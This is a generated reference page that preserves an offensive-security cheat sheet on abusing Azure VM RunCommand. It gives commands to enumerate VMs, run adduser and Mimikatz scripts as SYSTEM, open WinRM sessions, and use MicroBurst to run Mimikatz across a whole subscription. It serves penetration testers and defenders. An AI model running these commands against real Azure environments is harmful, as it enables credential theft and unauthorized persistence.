---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Azure Services - Virtual Machine

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-cloud-azure-azure-services-virtual-machine` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cloud/azure/azure-services-virtual-machine.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Azure Services - Virtual Machine](../../topics/cloud/azure-services-virtual-machine.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-cloud-azure-azure-services-virtual-machine |
| name | Azure Services - Virtual Machine |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/cloud/azure/azure-services-virtual-machine.md |

## Preserved Source Material

````yaml
_body: "# Azure Services - Virtual Machine\n\n## RunCommand\n\n> Allow anyone with \"Contributor\" rights to run PowerShell\
  \ scripts on any Azure VM in a subscription as `NT Authority\\System`\n\n**Requirements**: `Microsoft.Compute/virtualMachines/runCommand/action`\n\
  \n* List available Virtual Machines\n\n    ```powershell\n    PS C:\\> Get-AzureRmVM -status | where {$_.PowerState -EQ\
  \ \"VM running\"} | select ResourceGroupName,Name\n    ResourceGroupName    Name       \n    -----------------    ---- \
  \      \n    TESTRESOURCES        Remote-Test\n    ```\n\n* Get Public IP of VM by querying the network interface\n\n  \
  \  ```powershell\n    PS AzureAD> Get-AzVM -Name <RESOURCE> -ResourceGroupName <RG-NAME> | select -ExpandProperty NetworkProfile\n\
  \    PS AzureAD> Get-AzNetworkInterface -Name <RESOURCE368>\n    PS AzureAD> Get-AzPublicIpAddress -Name <RESOURCEIP>\n\
  \    ```\n\n* Execute Powershell script on the VM, like `adduser`\n\n    ```ps1\n    PS AzureAD> Invoke-AzVMRunCommand -VMName\
  \ <RESOURCE> -ResourceGroupName <RG-NAME> -CommandId 'RunPowerShellScript' -ScriptPath 'C:\\Tools\\adduser.ps1' -Verbose\n\
  \    PS Azure C:\\> Invoke-AzureRmVMRunCommand -ResourceGroupName TESTRESOURCES -VMName Remote-Test -CommandId RunPowerShellScript\
  \ -ScriptPath Mimikatz.ps1\n    ```\n\n* Finally you should be able to connect via WinRM\n\n    ```ps1\n    $password =\
  \ ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force\n    $creds = New-Object System.Management.Automation.PSCredential('username',\
  \ $Password)\n    $sess = New-PSSession -ComputerName <IP> -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType\
  \ NoProxyServer)\n    Enter-PSSession $sess\n    ```\n\nAgainst the whole subscription using `MicroBurst.ps1`\n\n```powershell\n\
  Import-module MicroBurst.psm1\nInvoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt\n```\n\n## References\n\
  \n* [Running Powershell scripts on Azure VM - Karl Fosaaen - November 6, 2018](https://blog.netspi.com/running-powershell-scripts-on-azure-vms/)\n\
  * [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)"
_relative_path: cloud/azure/azure-services-virtual-machine.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cloud/azure/azure-services-virtual-machine.md
````
